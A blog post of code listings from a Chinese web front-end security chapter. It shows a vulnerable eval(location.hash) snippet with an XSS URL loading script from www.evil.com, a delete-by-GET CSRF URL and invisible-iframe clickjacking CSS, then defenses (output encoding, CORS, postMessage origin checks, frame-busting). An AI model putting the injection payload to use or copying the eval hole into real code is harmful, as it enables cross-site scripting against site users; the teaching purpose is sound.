---
layout: post
title: 《Web前端开发最佳实践》第11章-源代码
fullview: false
---
## 第11章 高安全性的JavaScript
如果网站的前端代码中有如下的代码段：

	<script>
	    eval(location.hash.substr(1));
	</script>

攻击者发现页面上有这样的代码，则可以构建如下的URL：

	http://host/test.html#document.write("<script/src=//www.evil.com/evil.js></script>”)

假设网站a有个页面是通过GET请求来删除数据的，使用的URL如下：

		http://www.a.com/del?id=21

使用前端技术很容易实现一个不可见且浮在最上层的iframe窗口，如下的样式代码展示了其具体的实现：

	filter:alpha(opacity=0);
	opacity:0;
	z-index: 100;

### 11.2 不要信任任何外部传入的数据.
如果期望更灵活地控制输入内容，则可以使用jQuery插件jqencoder 。如下是此插件提供的各种编码接口：

	$.encoder.encodeForHTML()
	$.encoder.encodeForHTMLAttribute()
	$.encoder.encodeForJavaScript()
	$.encoder.encodeForCSS()
	$.encoder.encodeForURL()
A网站引用脚本的方式类似如下：

	<script  src="http://server2.example.com/RetrieveUser?UserId=1823&jsonp=parseResponse">
	 </script>
上述代码中parseResponse为传入的回调函数名称，B网站组合后返回的代码类似如下：

	parseResponse({"Name": "Cheeso", "Id" : 1823, "Rank": 7})

CORS主要的原理是在服务器端设置Access-Control-Allow-Origin头，从而限定了服务请求的发起端。如下是一个设置的示例：

	Access-Control-Allow-Origin: http://www.dang-jian.com

HTML5规范中也引入了另外一个跨域数据传输的方案，即使用window.postMessage 接口。使用示例如下：

	popup.postMessage("这是传输的数据",
	                  "https://secure.example.net");

然后在目标页面中添加如下的代码：

	function receiveMessage(event) {
	  if (event.origin !== "http://example.org") {
	    return
	    // event.source 指向popup
	    // event.data 的内容是 "这是传输的数据"
	  }
	}

	window.addEventListener("message", receiveMessage, false);

### 11.3 其他前端安全防范实践
传统的方式是使用Javascript代码来阻止网页被其他网页嵌套，首先在页面中添加如下的样式：

	<style id="antiClickjack">body{display:none !important;}</style>

同时添加类似如下的JavaScript代码：

	<script type="text/javascript">
	   if (self === top) {
	       var antiClickjack = document.getElementById("antiClickjack");
	       antiClickjack.parentNode.removeChild(antiClickjack);
	   } else {
	       top.location = self.location;
	   }
	</script>